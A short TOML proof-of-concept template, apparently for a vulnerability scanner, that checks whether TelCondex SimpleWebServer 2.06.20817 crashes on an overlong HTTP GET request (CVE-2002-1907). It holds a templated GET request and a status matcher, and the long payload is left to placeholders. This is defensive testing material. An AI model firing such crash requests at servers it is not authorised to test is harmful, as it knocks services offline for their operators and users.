[info]
author = "ave"
description = "TelCondex SimpleWebServer 2.06.20817 存在输入验证缺陷，其 HTTP 请求处理模块未对客户端提交的 GET 请求长度进行有效限制。当远程攻击者向服务器发送超长 HTTP GET 请求时，服务器无法正确处理该异常输入，导致程序崩溃或服务中断。"
id = "POC-AVE-2002-0724"
name = "CVE-2002-1907 PoC"
severity = "medium"
tags = ["ave-2002-0724"]
vuln_id = [
    "CVE-2002-1907",
    "AVE-2002-0724",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{index}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = false
status = [0]
type = "status"
